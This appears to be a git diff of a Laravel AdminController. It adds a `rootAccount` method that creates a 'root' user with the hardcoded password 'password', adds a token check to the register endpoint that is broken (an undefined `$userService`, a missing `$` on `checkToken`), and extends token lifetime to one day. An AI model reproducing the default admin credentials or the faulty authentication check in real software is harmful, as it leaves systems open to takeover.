@@ -49,16 +49,14 @@ class AdminController extends Controller
      * Store a newly created resource in storage.
      */
 
-     public function store(StoreAdminRequest $request) // register API
-     {
-         $user = new User();
-         $input = $request->all();
-         $user->name = $input['name'];
-         $user->password = Hash::make($input['password']);
-         $user->email = $input['email'];
-         $user->type = $input['type'];
-         $user-> save();
-         $data=[
+     public function rootAccount(){
+        $user = new User();
+        $user-> name = "root";
+        $user-> password = Hash::make('password');
+        $user->email = "root2024@yopmail.com";
+        $user->type = 0;
+        $user-> save();
+        $data=[
              "code" => 200,
              "message" => "Success",
              "user" => new UserResource($user)
@@ -66,11 +64,39 @@ class AdminController extends Controller
          return response()->json($data);
      }
 
+     public function store(StoreAdminRequest $request) // register API
+     {
+        $token = $request->bearerToken();
+        //$checkToken = Token::where("token",'=', $token)->first();
+        $checkToken = $userService->checkAuthen($token);
+        if(!checkToken){
+            $data=[
+                "code" => 400,
+                "message" => "Unauthorized",
+            ];
+        }
+        else{
+            $user = new User();
+            $input = $request->all();
+            $user->name = $input['name'];
+            $user->password = Hash::make($input['password']);
+            $user->email = $input['email'];
+            $user->type = $input['type'];
+            $user-> save();
+            $data=[
+                "code" => 200,
+                "message" => "Success",
+                "user" => new UserResource($user)
+            ];
+        }
+         return response()->json($data);
+     }
+
       /**
      * ChangePassowrd.
      */
 
-     public function resetPassword(Request $request) // register API
+     public function resetPassword(Request $request) // admin reset API
      {
         $input = $request->all();
          $user =  User::find($input['id']);
@@ -225,7 +251,7 @@ class AdminController extends Controller
                 else{
                     $token = new Token;
                     $token->token = $api_token;
-                    $token->expires_at = Carbon::now()->addMinutes(2) ;
+                    $token->expires_at = Carbon::now()->addDays(1) ;
                     $token->save();
                 }
                 $model->remember_token= $api_token;
